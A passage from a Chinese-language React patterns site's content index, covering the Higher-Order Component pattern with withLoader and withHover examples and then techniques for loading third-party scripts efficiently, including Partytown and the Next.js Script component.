HOC h 的最低版本！\nfunction withLoader(Element) {\rreturn props =\u0026gt; \u0026lt;Element /\u0026gt;;\r} 然而，我们不只是想返回它收到的元素。 相反，我们希望这个元素包含告诉我们数据是否仍在加载的逻辑。\n为了使 withLoader HOC 非常可重用，我们不会在该组件中硬编码 Dog API url。 相反，我们可以将 URL 作为参数传递给 withLoader HOC，因此这个加载器可以用于任何需要加载指示器的组件，同时从不同的 API 端点获取数据。\nfunction withLoader(Element, url) {\rreturn props =\u0026gt; {};\r} 一个 HOC 返回一个元素，一个功能组件 props =\u0026gt; {} 想要添加逻辑，允许显示带有 Loading\u0026hellip; 的文本，因为数据仍在获取中。 获取数据后，组件应将获取的数据作为 prop 传递。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  //DogImages.js import React from \u0026#34;react\u0026#34;; import withLoader from \u0026#34;./withLoader\u0026#34;; function DogImages(props) { return props.data.message.map((dog, index) =\u0026gt; ( \u0026lt;img src={dog} alt=\u0026#34;Dog\u0026#34; key={index} /\u0026gt; )); } export default withLoader( DogImages, \u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34; );   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //withLoader.js import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function withLoader(Element, url) { return (props) =\u0026gt; { const [data, setData] = useState(null); useEffect(() =\u0026gt; { async function getData() { const res = await fetch(url); const data = await res.json(); setData(data); } getData(); }, []); if (!data) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } return \u0026lt;Element {...props} data={data} /\u0026gt;; }; }   Perfect！ 完美的！ 我们刚刚创建了一个可以接收任何组件和 url 的 HOC。\n  在 useEffect 钩子中，withLoader HOC 从我们作为 url 值传递的 API 端点获取数据。 虽然数据尚未返回，但我们返回包含 Loading\u0026hellip; 文本的元素。\n  获取数据后，我们将 data 设置为等于已获取的数据。 由于数据不再为空，我们可以显示我们传递给 HOC 的元素！\n  那么，我们如何将这种行为添加到我们的应用程序中，以便它实际上会在 DogImages 列表上显示 Loading\u0026hellip; 指示器？\n在 DogImages.js 中，我们不再只想导出普通的 DogImages 组件。 相反，我们希望围绕 DogImages 组件导出“包装的” withLoading HOC。\nexport default withLoading(DogImages); withLoading HOC 还希望 url 知道从哪个端点获取数据。 在这种情况下，我们要添加 Dog API 端点。\nexport default withLoader(\rDogImages,\r\u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;\r); 由于 withLoader HOC 返回了带有额外数据道具的元素，在本例中为 DogImages，我们可以访问 DogImages 组件中的数据道具。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  //DogImages.js import React from \u0026#34;react\u0026#34;; import withLoader from \u0026#34;./withLoader\u0026#34;; function DogImages(props) { return props.data.message.map((dog, index) =\u0026gt; ( \u0026lt;img src={dog} alt=\u0026#34;Dog\u0026#34; key={index} /\u0026gt; )); } export default withLoader( DogImages, \u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34; );   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //withLoader.js import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function withLoader(Element, url) { return (props) =\u0026gt; { const [data, setData] = useState(null); useEffect(() =\u0026gt; { async function getData() { const res = await fetch(url); const data = await res.json(); setData(data); } getData(); }, []); if (!data) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } return \u0026lt;Element {...props} data={data} /\u0026gt;; }; }   Perfect！ 我们现在在获取数据时看到一个 Loading\u0026hellip; 屏幕。\n高阶组件模式允许我们为多个组件提供相同的逻辑，同时将所有逻辑保存在一个地方。\nwithLoader HOC 不关心它接收到的组件或 url：只要它是一个有效的组件和一个有效的 API 端点，它就会简单地将数据从该 API 端点传递给我们传递的组件。\n\r组合 我们还可以组合多个高阶组件。\n假设还想添加显示悬停的功能！ 当用户将鼠标悬停在 DogImages 列表上时的文本框。\n需要创建一个 HOC，为传递的元素提供悬停道具。 基于该道具，可以根据用户是否将鼠标悬停在 DogImages 列表上，有条件地呈现文本框。\n现在可以将 withHover HOC 包裹在 withLoader HOC 周围。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //DogImages.js import React from \u0026#34;react\u0026#34;; import withLoader from \u0026#34;./withLoader\u0026#34;; import withHover from \u0026#34;./withHover\u0026#34;; function DogImages(props) { return ( \u0026lt;div {...props}\u0026gt; {props.hovering \u0026amp;\u0026amp; \u0026lt;div id=\u0026#34;hover\u0026#34;\u0026gt;Hovering!\u0026lt;/div\u0026gt;} \u0026lt;div id=\u0026#34;list\u0026#34;\u0026gt; {props.data.message.map((dog, index) =\u0026gt; ( \u0026lt;img src={dog} alt=\u0026#34;Dog\u0026#34; key={index} /\u0026gt; ))} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); } export default withHover( withLoader(DogImages, \u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;) );   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  //withHover.js import React, { useState } from \u0026#34;react\u0026#34;; export default function withHover(Element) { return props =\u0026gt; { const [hovering, setHover] = useState(false); return ( \u0026lt;Element {...props} hovering={hovering} onMouseEnter={() =\u0026gt; setHover(true)} onMouseLeave={() =\u0026gt; setHover(false)} /\u0026gt; ); }; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  //withLoader.js import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function withLoader(Element, url) { return props =\u0026gt; { const [data, setData] = useState(null); useEffect(() =\u0026gt; { fetch(url) .then(res =\u0026gt; res.json()) .then(data =\u0026gt; setData(data)); }, []); if (!data) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } return \u0026lt;Element {...props} data={data} /\u0026gt;; }; }   DogImages 元素现在包含从 withHover 和 withLoader 传递的所有道具。 现在可以有条件地渲染悬停！ 文本框，基于悬停道具的值是真还是假。\n一个著名的用于组成 HOC 的库是 recompose。 由于 HOC 在很大程度上可以被 React Hooks 替代，因此不再维护 recompose 库，因此本文不会涉及。\n\r优点 使用高阶组件模式允许我们将所有要重用的逻辑放在一个地方。 通过一遍又一遍地复制代码，这降低了在整个应用程序中意外传播错误的风险，每次都可能引入新的错误。 通过将逻辑全部放在一个地方，我们可以保持我们的代码 DRY 并轻松实施关注点分离。\n\r缺点 HOC 可以传递给元素的 prop 的名称可能会导致命名冲突。\nfunction withStyles(Component) {\rreturn props =\u0026gt; {\rconst style = { padding: \u0026#39;0.2rem\u0026#39;, margin: \u0026#39;1rem\u0026#39; }\rreturn \u0026lt;Component style={style} {...props} /\u0026gt;\r}\r}\rconst Button = () = \u0026lt;button style={{ color: \u0026#39;red\u0026#39; }}\u0026gt;Click me!\u0026lt;/button\u0026gt;\rconst StyledButton = withStyles(Button) 在这种情况下， withStyles HOC 向我们传递给它的元素添加了一个名为 style 的道具。 但是，Button 组件已经有一个名为 style 的 prop，它将被覆盖！ 通过重命名道具或合并道具，确保 HOC 可以处理意外的名称冲突。\nfunction withStyles(Component) {\rreturn props =\u0026gt; {\rconst style = {\rpadding: \u0026#39;0.2rem\u0026#39;,\rmargin: \u0026#39;1rem\u0026#39;,\r...props.style\r}\rreturn \u0026lt;Component style={style} {...props} /\u0026gt;\r}\r}\rconst Button = () = \u0026lt;button style={{ color: \u0026#39;red\u0026#39; }}\u0026gt;Click me!\u0026lt;/button\u0026gt;\rconst StyledButton = withStyles(Button) 当使用多个组合的 HOC 将 props 传递给包裹在其中的元素时，可能很难确定哪个 HOC 负责哪个 prop。 这可能会阻碍调试和轻松扩展应用程序。\n","description":"将可重用逻辑作为道具传递给整个应用程序的组件","id":126,"section":"react-patterns","tags":null,"title":"HOC 模式（X）","uri":"https://codthing.github.io/react-patterns/design-patterns/hoc-pattern/"},{"content":"第三方资源可能会降低网站速度，并且可能是优化的挑战。\n可以遵循某些最佳实践来有效地加载或延迟不同类型的第三方。\n还可以使用框架级组件，例如 Next.js 脚本组件，它提供了一个模板，用于构建加载第三方脚本的“何时”和“如何”。\n或者，像 Partytown 这样的实验性想法可能会引起人们的兴趣。\n很难找到一个在孤岛中运作的现代网站。\n大多数站点共存并依赖网络上的其他几个来源来获取数据、功能、内容等。\n位于另一个域并由您的站点使用的任何资源都是您站点的第三方 (3P) 资源。\n站点中包含的典型第三方资源包括\n  嵌入地图、视频、社交媒体和聊天服务\n  广告\n  分析组件和标签管理器\n  A/B 测试和个性化脚本\n  提供即用型辅助功能的实用程序库，例如用于数据可视化或动画的功能。\n  reCAPTCHA 或 CAPTCHA 用于机器人检测。\n  可以使用第三方来集成其他功能，\n为内容增加价值或减少从头开始构建网站所涉及的一些苦差事。\n根据 2021 年网络年鉴报告，网络上超过 94% 的页面使用第三方——图像和 JavaScript 是第三方内容的最重要贡献者。\n以下是按内容类型和类别对第三方请求进行的有用细分：\n虽然第三方资源可以通过有价值的功能丰富您的网站，但如果出现以下情况，它们也会减慢速度：\n  对于每个所需的资源，它们都会导致到第三方域的额外往返。\n  它们大量使用 JavaScript（影响下载和执行时间）或由于未优化的图像/视频而体积庞大。\n  个别网站所有者无法影响实施，他们的行为可能无法预测。\n  它们可以阻止页面上其他关键资源的呈现并影响 Core Web Vitals (CWV)。\n  尽管存在这些问题，第三方可能对业务至关重要。\n如果不能取消 3P，那么接下来最好的事情就是优化它们以减少性能影响 - 这就是本节中介绍的内容。\n包含了一些适用于不同类型第三方脚本的策略和最佳实践。\nNext.js Script 组件包含许多这些最佳实践，可以在本文的后半部分了解它。\n首先看看如何确定第三方脚本是否会损害页面的性能。\n评估 3P 资源的性能影响 可以使用多种技术来查找第三方代码如何影响网站。\n以下 Lighthouse 审计有助于识别影响 CWV 的缓慢第三方脚本。\n  减少第三方代码对阻塞主线程的脚本的影响。\n  减少需要很长时间执行的脚本的 JavaScript 执行时间\n  避免大型脚本的巨大网络负载\n    使用 WebPageTest (WPT) 瀑布图来识别第三方阻止脚本或 WPT 并排比较来衡量 3rd 方标签的影响。\n  Bundlephobia 等网站有助于评估将可用 npm 包添加到您的包中的成本。 还可以使用 npm 包搜索查找任何包中包含的大小和依赖项。\n  有了识别有问题的第三方代码的背景，让我们探索优化它的方法。\n\r优化策略 由于第三方代码不受您的控制，因此您无法直接优化库。 这给您留下了两个选择。\n  替换或移除：\n如果第三方脚本提供的值与其性能成本不成正比，请考虑将其移除。 还可以评估其他轻量级但提供类似功能的替代方案。 在本案例研究中，将讨论如何通过切换具有更轻量级替代品和类似功能的软件包来提高电影应用程序的性能。\n  优化加载顺序：\n加载过程涉及在浏览器中加载多个第一方和第三方资源。 要设计最佳加载策略，需要考虑为不同资源分配的浏览器优先级、它们在页面上的位置以及每个资源在网页中的价值。 我们为 React/Next.js 应用程序提出了最佳加载顺序。 我们现在将看到这如何适用于各种第三方资源以及可以采取哪些步骤以最佳方式加载它们。\n  高效加载 3P 脚本 以下是经过时间考验的最佳实践，如果使用得当，它们可以减少第三方资源的性能影响。\n使用 async 或 defer 来防止脚本阻止其他内容。\n适用于：非关键脚本（标签管理器、分析）\nJavaScript 下载和执行默认是同步的，可以阻止主线程上的 HTML 解析器和 DOM 构建。\n在 \u0026lt;script\u0026gt; 元素中使用 async 或 defer 属性告诉浏览器异步下载脚本。\n可以使用这些来下载关键渲染路径（例如，主 UI 组件）不需要的任何脚本\ndefer：脚本在解析器执行时并行获取，脚本执行延迟到解析完成。 Defer 应该是延迟执行直到 DOM 构建之后的默认选择。\nasync：脚本在解析时并行获取，但在阻塞解析器时会在可用时立即执行。\n对于有依赖的模块脚本，脚本及其所有依赖都在 defer 队列中执行。\n对需要在加载过程中更早运行的脚本使用 async。\n例如，可能希望在不丢失任何早期页面加载数据的情况下尽早执行特定的分析脚本。\n\u0026lt;script src=\u0026#34;https://example.com/deferthis.js\u0026#34; defer\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#34;https://example.com/asyncthis.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt;  developers.google.com\n 这里值得一提的一个警告是 async 和 defer 降低了浏览器分配的资源优先级，导致其加载时间显着延迟。 优先级提示的新功能可以帮助解决此问题。\n使用资源提示建立与所需来源的早期连接 适用于：来自第三方 CDN 的关键脚本、字体、CSS、图像\n由于每个第三方服务器可能需要 DNS 查找、重定向和多次往返，连接到第三方源可能会很慢。\n资源提示 dns-prefetch 和 preconnect 通过在生命周期的早期启动连接来帮助减少此设置所需的时间。\n包含与域对应的 dns-prefetch 资源提示将提前执行 DNS 查找，从而减少与 dns 查找相关的延迟。 可以将其与最关键资源的预连接配对。\n除了 DNS 查找之外，预连接还通过执行 TCP 往返和处理 TLS 协商来启动与第三方域的连接。\n\u0026lt;head\u0026gt;\r\u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;http://example.com\u0026#34;\u0026gt;\r\u0026lt;link rel=\u0026#34;dns-prefetch\u0026#34; href=\u0026#34;http://example.com\u0026#34;\u0026gt;\r\u0026lt;/head\u0026gt; 延迟加载 3P 资源 适用于：YouTube、地图、广告和社交媒体等嵌入\n第三方嵌入（例如用于社交媒体提要、广告、YouTube 视频和地图的嵌入）可能会降低网页速度。\n但是，所有此类嵌入在页面加载时可能对用户不可见，并且在用户向下滚动到它们时可能会延迟加载。\n可以根据所需的浏览器支持使用不同的延迟加载方法。\n  loading 属性可以与图像和 iframe 一起使用，这些图像和 iframe 通常用于加载第三方嵌入，例如 YouTube 或 Google 地图的嵌入。\n  使用 IntersectionObserver API 的自定义检测被观察元素何时进入或退出浏览器的视口。\n  Lazy-sizes - 一个流行的 JavaScript 库，可为实现延迟加载。\n  延迟加载嵌入的一种变体使用在页面加载时向用户显示的静态或动态外观。\n可以使用实际嵌入的静态图像代替地图嵌入来显示地图嵌入上的特定区域。\n或者，使用看起来像嵌入但仅在用户单击或与之交互时加载的外观。\n流行的嵌入实现外观的一些方法包括用于地图的 Map Static API、用于 Twitter 嵌入的 Tweetpik、用于 YouTube 的 lite-youtube-embed、用于聊天小部件的 React-live-chat-loader。\n有关这些技术的全面讨论可在此处获得。\n关于延迟加载和外墙的一些注意事项\n  YouTube 外观在 iOS 和 Safari 上的 macOS 11+ 上的行为略有不同。 第一次点击/点击加载实际的视频嵌入。 用户必须再次点击才能播放视频。\n  如果未指定嵌入的大小，延迟加载会导致布局偏移并影响用户体验。 为了防止布局偏移，应该为所有延迟加载的嵌入或其容器元素指定大小。\n  自托管 3P 脚本以防止往返 适用于：JavaScript 文件、字体\n  尽管 preconnect 或 dns-prefetch 允许尽早启动与第三方源的连接，但这些连接仍然是必需的。此外，对于第三方来源，需要依赖他们的缓存策略，这可能不是最佳的。\n  在同一源上自托管脚本的副本可更好地控制用于脚本的加载和缓存过程。自托管减少了 DNS 查找所需的时间，并允许您使用 HTTP 缓存改进脚本的缓存策略。还可以使用 HTTP/2 服务器推送来推送您知道用户需要的脚本。自托管第三方脚本的一个很好的例子是 Casper.com，它通过 Optimizely 提供的自托管第三方脚本将其主页的开始渲染时间缩短了 1.7 秒。\n  对于第三方脚本的自托管副本，必须确保根据对原始脚本的更改定期更新副本。如果没有更新，脚本可能会过时，缺少与依赖项对应的重要修复或更改。在服务器上自托管而不是 CDN 也会阻止您利用 CDN 采用的边缘缓存机制。\n尽可能使用 Service Worker 缓存脚本 适用于：JavaScript 文件、字体\n对于频繁更改的脚本，自托管可能不是一个选项。 可以使用 Service Worker 来改进此类第三方脚本的缓存，同时还可以利用 CDN 边缘缓存。 这种技术可以更好地控制通过网络重新获取的频率。可以与预连接结合使用，以进一步降低获取操作的网络成本。 还可以加载资源，以便将非必要的第三方脚本的请求推迟到页面到达关键用户时刻。\n遵循理想的加载顺序\n考虑上述针对不同类型第三方的指南及其对页面的价值。 根据每个资源的预期用途，可以遵循理想的资源加载顺序，以最佳方式交错第一方和第三方资源，以加快页面加载速度。\n\r按脚本类型划分的最佳实践 有些脚本比其他脚本更容易优化。\n与 Web 性能专家就优化不同的第三方、观察到的一些典型约束以及他们加载第三方的愿望清单进行讨论后，得出了一些有趣的结论。\n普遍的共识是，大多数用户在看到某个特定阈值的内容之前不会与站点进行交互。\n以下是特定于不同脚本类型的指南。\n非关键 JavaScript 大多数第三方（如聊天小部件或分析脚本）对用户体验并不重要，可能会延迟。 使用 defer 脚本属性是延迟这些脚本的加载和执行的最常用方法。\n广告或分析团队可能会担心推迟脚本对应用程序的可见性和广告收入的影响。 Telegraph 案例研究经常在这种情况下被引用，其中推迟所有脚本不会影响任何分析或广告指标。 相反，第一个广告加载指标平均提高了 4 秒。 一些开发人员还设计了一些解决方案，将第三方的加载延迟到页面变为可交互之后。\n机器人检测/ReCaptcha 由于希望阻止机器人访问 Web 表单，因此开发人员通常会尽早加载这些脚本。\n然而，ReCaptcha 有相当大的 JS 负载和主线程占用空间，因此有动力将它推迟到需要时加载。\n优化此脚本的几种方法是\n  仅在几个页面上加载它，其中包含可能被机器人发送垃圾邮件的用户表单输入。\n  当用户与表单交互时延迟加载脚本，例如，在表单焦点上。\n  当需要在页面加载时执行脚本，使用资源提示建立早期连接。\n  谷歌标签管理器 (GTM) 大型网站通常允许 Google 跟踪代码管理器访问营销团队或代理机构。\n这允许他们向网站上的所有页面添加新的营销标签，以便更好地进行跟踪。\n性能不是营销团队的主要关注点，他们所有人可能都不知道，不加考虑地添加标签会减慢网站的速度。\nGTM 脚本的优化更多是关于控制谁访问 GTM 并监控他们所做的更改。\n可以首先确保网站所有者拥有帐户而不是外部机构。这允许您为可以添加、编辑和发布标签的人员定义精细的访问权限。\n可以在开发和营销部门之间建立更好的协作来审核新标签并删除未使用的标签。\n网站可能不需要在所有页面上使用 GTM。 （例如，营销团队没有理由在电子商务网站的结帐页面上跟踪事件）。\n应单独审核页面，以便删除不必要的 GTM 内容。\n如果用户拒绝 cookie，使用 cookie 横幅的站点也可以选择不加载 GTM。\n最后，如果必须在页面上加载 GTM，可以在加载主要内容后推迟触发脚本。\n另一个适用于旧第三方脚本标签的优化与 document.write() 相关。\n使用 document.write() 注入脚本是不安全的，并且可能会导致基于浏览器和脚本类型的警告或错误。\n一些第三方脚本仍然使用这种方法。 GTM 在其自定义 HTML 标签创建界面中提供了一个名为 Support document.write() 的配置。\n如果启用此功能，Google 标签管理器会临时用自己的安全版本替换默认的 document.write() 函数。\nA/B 测试和个性化 网站进行 A/B 测试以检查哪个版本的网页性能更好。\n页面的两种变体之一是为已识别的用户样本中的不同用户加载的。 A/B 测试会显着影响运行它们的页面的性能，每个测试都会增加多达 1 秒的加载时间。\n目前，许多 A/B 测试都是通过第三方从外部获取的，开发人员几乎无法控制为更改这些测试的 UI 而执行的 JavaScript 代码。\n站点个性化是一个相关概念，它涉及运行脚本以根据已知数据为不同用户提供量身定制的体验。\n这些脚本同样很重并且难以优化。与 A/B 测试脚本一样，个性化脚本也需要尽早运行，因为呈现的 UI 取决于脚本的输出。\n为 A/B 测试和个性化开发基于服务器的自定义解决方案是优化 A/B 测试的理想方法。然而，它可能并不总是可行的。\n为了优化第三方 A/B 测试脚本，您可以限制接收脚本的用户数。\n该脚本根据试探法确定要显示的版本，并为用户启用正确的版本。这可能会减慢所有用户的页面速度。 Google 的优化器允许配置用于定位用户的规则。其中许多规则都可以在 Google 服务器上进行评估，因此对非目标用户的性能影响很小。\nYouTube 和地图嵌入 这些嵌入很重，开发人员必须探索延迟加载或点击加载模式来加载嵌入以优化它们。\n鼓励使用 lite-youtube-embed 等解决方案，同时注意在 iOS/macOS-Safari 中需要双击/单击才能使用此外观播放视频。\n社交媒体嵌入 一些社交媒体嵌入提供了延迟加载脚本的选项（例如，Facebook 嵌入中的数据延迟）。\n可以探索它以提高性能。\n另一种选择是使用手动创建的图像外观或使用诸如 tweetpik 之类的工具。\n开箱即用的优化 为了优化第三方，开发团队应该了解资源提示、延迟加载、HTTP 缓存和服务工作者的细微差别，然后在他们的解决方案中实现这些。一些框架和库以开发人员可以轻松使用的方式封装了这些最佳实践。\n由 Builder.io 创建的 Partytown 是一个实验性库，可帮助在 Web Worker 而不是主线程上运行资源密集型脚本。他们的理念是主线程应该专用于您的代码，关键路径不需要的任何脚本都可以被沙箱化并隔离到网络工作者。 Partytown 允许您配置对主线程 API（如 cookie、localStorage、userAgent 等）的访问。API 调用也可以使用参数记录，以便更好地了解脚本的作用。\nJavaScript 代理和 Service Worker 处理 Web Worker 和主线程之间的通信。 Partytown 脚本必须自托管在与 HTML 文档相同的服务器上。它可以与 React 或 Next.js 应用程序一起使用，甚至可以在没有任何框架的情况下使用。可以在 Web 服务器中执行的每个第三方脚本都应将其打开脚本标记的类型属性设置为 text/partytown，如下所示。\n1 2 3 4  \u0026lt;script type=\u0026#34;text/partytown\u0026#34;\u0026gt; // Third-party analytics scripts \u0026lt;/script\u0026gt;   该库还提供了一个 React Partytown 组件，您可以直接将其包含在您的 React 或 Next.js 项目中。\n对于 Next.js 文档，它可以包含在文档 \u0026lt;head\u0026gt; 中，如下所示。\nimport { Partytown } from \u0026#39;@builder.io/partytown/react\u0026#39;;\rimport Document, { Html, Head, Main, NextScript } from \u0026#39;next/document\u0026#39;;\rexport default class MyDocument extends Document {\rrender() {\rreturn (\r\u0026lt;Html\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;Partytown /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Main /\u0026gt;\r\u0026lt;NextScript /\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/Html\u0026gt;\r);\r} Partytown 还包括用于常见分析库（例如 Google 标签管理器）的 React 组件。\n以下示例展示了如何将其添加到 React/Next.js 项目中。\nimport { Partytown, GoogleTagManager, GoogleTagManagerNoScript } from \u0026#39;@builder.io/partytown/react\u0026#39;;\rimport Document, { Html, Head, Main, NextScript } from \u0026#39;next/document\u0026#39;;\rexport default class MyDocument extends Document {\rrender() {\rreturn (\r\u0026lt;Html\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;GoogleTagManager containerId={\u0026#39;GTM-XXXXX\u0026#39;} /\u0026gt;\r\u0026lt;Partytown /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;GoogleTagManagerNoScript containerId={\u0026#39;GTM-XXXXX\u0026#39;} /\u0026gt;\r\u0026lt;Main /\u0026gt;\r\u0026lt;NextScript /\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/Html\u0026gt;\r);\r} Next.js 本身通过其 Script 组件为第三方脚本提供开箱即用的优化。\n让我们看看这如何让我们提高不同第三方的加载性能。\n\rNext.js 脚本组件 ✔ Next.js 11 于 2021 年年中发布，其组件基于 Google 的 Aurora 团队引入的一致性方法。\nConformance 是一个系统，它提供精心设计的解决方案和规则，以支持最佳加载和 Core Web Vitals。\n一致性将最佳实践编入规则集，开发人员可以轻松实施。\n强大的默认设置和可操作的规则构成了该系统的基础。\n它们使开发人员可以轻松地做正确的事情并防止反模式潜入。\nNext.js 脚本组件通过提供可提高加载性能的可自定义模板来使用一致性。\nScript 组件封装了 \u0026lt;script\u0026gt; 标签，允许使用 strategy 属性设置第三方脚本的加载优先级。\n策略属性可以采用三个值。\n  beforeInteractive：将此用于浏览器应在页面变为交互式之前执行的关键脚本。 （例如，机器人检测）\n  afterInteractive：用于在页面交互后浏览器可以运行的脚本。 （例如，标签管理器）这是应用的默认策略，相当于使用 defer 加载脚本\n  lazyOnload：用于在浏览器空闲时可以延迟加载的脚本。\n  设置策略有助于 Next.js 自动应用优化和最佳实践来加载脚本，同时确保最佳加载顺序。\n可以使用带有策略属性的脚本标记，如下所示。\n与原生 HTML 脚本标签不同，不得将 next/script 标签放置在 next/head 组件或 pages/document.js 中。\nBefore:\nimport Head from \u0026#39;next/head\u0026#39;\rexport default function Home() {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;script async src=\u0026#34;https://example.com/samplescript.js\u0026#34; /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} After:\n1 2 3 4 5 6 7 8 9 10 11 12  // pages/index.js // 当未指定策略时，将应用默认策略 afterinteractive。 import Script from \u0026#39;next/script\u0026#39; \u0026lt;br\u0026gt; export default function Home() { return ( \u0026lt;\u0026gt; \u0026lt;Script src=\u0026#34;https://example.com/samplescript.js\u0026#34; /\u0026gt; \u0026lt;/\u0026gt; ) }   Script 组件允许处理前面讨论的许多用例。\n可以使用它来加载用于分析、社交媒体、实用程序库等的第三方脚本。\n以下示例演示了如何将上述策略应用于不同类型的第三方脚本。\n尽早加载 polyfill 如果希望提前加载适用于核心内容的特定 polyfill，可以使用 beforeInteractive 策略加载 polyfill，\n如 Next.js 文档中的以下示例所示。\nimport Script from \u0026#39;next/script\u0026#39;\rexport default function Home() {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Script src=\u0026#34;https://polyfill.io/v3/polyfill.min.js?features=IntersectionObserverEntry%2CIntersectionObserver\u0026#34;\rstrategy=\u0026#34;beforeInteractive\u0026#34;\r/\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} 延迟加载社交媒体嵌入 社交媒体嵌入，尤其是那些在页面加载时不可见的嵌入，\n可以在用户滚动到它们时或在不活动期间延迟或延迟加载。\n可以使用 lazyonload 策略，如以下代码段所示。\nimport Script from \u0026#39;next/script\u0026#39;\rexport default function Home() {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Script\rsrc=\u0026#34;https://connect.facebook.net/en_US/sdk.js\u0026#34; strategy=\u0026#34;lazyOnload\u0026#34;\r/\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} 在加载时有条件地执行代码 可能有一些代码需要在特定的第三方加载后执行。 这可以在脚本组件的 onload 属性中指定。\n例如，以下代码段显示了如何包含将根据用户同意执行的代码。\n1 2 3 4 5 6 7 8  \u0026lt;Script src={url} // 同意管理  strategy=\u0026#34;beforeInteractive\u0026#34; onLoad={() =\u0026gt; { // 如果加载成功，则可以依次加载其他脚本  }} /\u0026gt;   在脚本标签中使用内联脚本 需要根据第三方组件的负载执行的内联脚本也可能包含在 Script 组件中，如下所示。\nimport Script from \u0026#39;next/script\u0026#39;\r\u0026lt;Script id=\u0026#34;show-banner\u0026#34; strategy=\u0026#34;lazyOnload\u0026#34;\u0026gt;\r{`document.getElementById(\u0026#39;banner\u0026#39;).removeClass(\u0026#39;hidden\u0026#39;)`}\r\u0026lt;/Script\u0026gt;\r// or\r\u0026lt;Script\rid=\u0026#34;show-banner\u0026#34;\rdangerouslySetInnerHTML={{\r__html: `document.getElementById(\u0026#39;banner\u0026#39;).removeClass(\u0026#39;hidden\u0026#39;)`\r}}\r/\u0026gt; 这里的内联脚本用于在延迟加载后更改第三方横幅广告的可见性。 请注意，也可以使用危险的 SetInnerHTML 属性包含内联脚本。\n将属性转发给第三方脚本 可以在脚本组件中设置第三方脚本可以使用的特定属性值。\n以下示例显示了如何将两个这样的属性传递给分析脚本。\nimport Script from \u0026#39;next/script\u0026#39;\rexport default function Home() {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Script\rsrc=\u0026#34;https://www.google-analytics.com/analytics.js\u0026#34;\rid=\u0026#34;analytics\u0026#34;\rnonce=\u0026#34;XUENAJFW\u0026#34;\rdata-test=\u0026#34;analytics\u0026#34;\r/\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} 加载分析脚本 使用 Google Analytics (GA) 和 Google Tag Manager (GTM) 可以通过不同的方式在网站上包含分析。\n可以使用脚本组件在 Next.js 网站上以最佳方式加载 gtag.js 或 analytics.js 脚本。 根据您要执行这些脚本的位置，您可以在 _app.js（适用于所有页面）或特定页面上加载它们。\n通过在 _app.js 中包含脚本组件，可以为站点上的所有页面启用 GTM，如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  import Script from \u0026#39;next/script\u0026#39; // + other imports  function MyApp({ Component, pageProps }) { // Other app code  return ( \u0026lt;\u0026gt; {/* Google Tag Manager - Global base code */} \u0026lt;Script strategy=\u0026#34;afterInteractive\u0026#34; dangerouslySetInnerHTML={{ __html: ` (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({\u0026#39;gtm.start\u0026#39;: new Date().getTime(),event:\u0026#39;gtm.js\u0026#39;});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!=\u0026#39;dataLayer\u0026#39;?\u0026#39;\u0026amp;l=\u0026#39;+l:\u0026#39;\u0026#39;;j.async=true;j.src= \u0026#39;https://www.googletagmanager.com/gtm.js?id=\u0026#39;+i+dl;f.parentNode.insertBefore(j,f); })(window,document,\u0026#39;script\u0026#39;,\u0026#39;dataLayer\u0026#39;, \u0026#39;${GTM_ID}\u0026#39;); `, }} /\u0026gt; \u0026lt;Component {...pageProps} /\u0026gt; \u0026lt;/\u0026gt; ) } export default MyApp   相反，如果想在特定页面上加载 analytics.js，\n可以将其包含在页面中，如图所示。\nimport Script from \u0026#39;next/script\u0026#39;\r//other imports\rconst Home = () =\u0026gt; {\rreturn (\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;Script id=\u0026#34;google-analytics\u0026#34; strategy=\u0026#34;afterInteractive\u0026#34;\u0026gt;\r{`\r(function(i,s,o,g,r,a,m){i[\u0026#39;GoogleAnalyticsObject\u0026#39;]=r;i[r]=i[r]||function(){\r(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new 